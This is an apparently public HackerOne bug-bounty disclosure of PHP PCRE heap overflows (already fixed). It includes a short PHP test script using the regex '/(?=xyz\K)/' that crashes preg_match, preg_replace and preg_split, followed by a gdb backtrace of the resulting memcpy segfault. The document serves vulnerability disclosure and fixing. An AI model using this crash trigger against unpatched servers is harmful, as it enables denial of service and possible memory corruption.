# Multiple vulnerabilities related to PCRE functions (already fixed)

## Report Details
- **Report ID**: 141839
- **URL**: https://hackerone.com/reports/141839
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-05-29T15:03:56.852Z
- **Disclosed**: 2019-11-12T09:35:35.841Z

## Reporter
- **Username**: mongo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
This issue was reported a while ago at: https://bugs.php.net/bug.php?id=70345
The report is now public, but for some reason I was not notified by email when the report was closed. I just remembered to check again today and noticed multiple code changes were made and the bug is now considered closed.
Would be nice if a bounty was still possible, even though so much time has passed.

Description:
------------
The pcre_exec() function generates a list of "offsets", each consisting
of a start and an end position within the subject string. Throughout the code its often assumed that
for each "offset", the start position is smaller than or equal to the end position.
However, certain regular expressions break this assumption (see the testcase for an example).

This leads to:
- Multiple heap overflows (through preg_match() or preg_replace(), for instance): in the best case scenario these are simply denial-of-service; exploitation to achieve arbitrary code execution might be possible, but not trivial.

- Memory exhaustion (through preg_split(), for instance)

I'm not providing filenames / line numbers with this bug report because pcre_exec() is used extensively throughout the codebase, and from what I have seen, all of its uses fail to fully validate the returned offsets and are thus vulnerable, to varying degrees.

Because regular expression functions are often exposed to user input, I believe this could be a fairly serious bug.

Test script:
---------------
<?php

$regex = '/(?=xyz\K)/';
$subject = "aaaaxyzaaaa";

// Comment/uncomment below as wanted.
// All 3 functions are vulnerable (note, other functions are affected as well)
preg_match($regex, $subject, $matches);
preg_replace($regex, '\0', $subject);
preg_split($regex, $subject);


Actual result:
--------------
A trace for preg_match, showing a SIGSEGV caused by a runaway memcpy:
```
(gdb) r
Starting program: php-5.6.12/sapi/cli/php go.php

Program received signal SIGSEGV, Segmentation fault.
__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118
118     ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.
(gdb) bt
#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118
#1  0x000000000047b6fc in memcpy (__len=18446744073709551613, __src=<optimized out>, __dest=<optimized out>) at /usr/include/x86_64-linux-gnu/bits/string3.h:51
#2  php_pcre_get_substring_list (subject=subject@entry=0x7ffff7ebbe18 "aaaaxyzaaaa", ovector=ovector@entry=0x7ffff7fcebc0, stringcount=stringcount@entry=1, listptr=listptr@entry=0x7fffffffaee8)
    at php-5.6.12/ext/pcre/pcrelib/pcre_get.c:477
#3  0x00000000004a569f in php_pcre_match_impl (pce=pce@entry=0x1012cf0, subject=0x7ffff7ebbe18 "aaaaxyzaaaa", subject_len=11, return_value=return_value@entry=0x7ffff7fcea58, subpats=0x7ffff7fce900, global=global@entry=0, use_flags=0, 
    flags=0, start_offset=0) at php-5.6.12/ext/pcre/php_pcre.c:707
#4  0x00000000004a614b in php_do_pcre_match (ht=3, return_value=0x7ffff7fcea58, global=0, return_value_used=<optimized out>, this_ptr=<optimized out>, return_value_ptr=<optimized out>) at php-5.6.12/ext/pcre/php_pcre.c:575
#5  0x000000000077894e in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at php-5.6.12/Zend/zend_vm_execute.h:558
#6  0x000000000070d968 in execute_ex (execute_data=0x7ffff7f9a158) at php-5.6.12/Zend/zend_vm_execute.h:363
#7  0x00000000006d4740 in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at php-5.6.12/Zend/zend.c:1341
#8  0x00000000006722f2 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd500) at php-5.6.12/main/main.c:2597
#9  0x000000000077a5bf in do_cli (argc=2, argv=0xe93760) at php-5.6.12/sapi/cli/php_cli.c:994
#10 0x0000000000426980 in main (argc=2, argv=0xe93760) at php-5.6.12/sapi/cli/php_cli.c:1378
```

## Attachments
No attachments
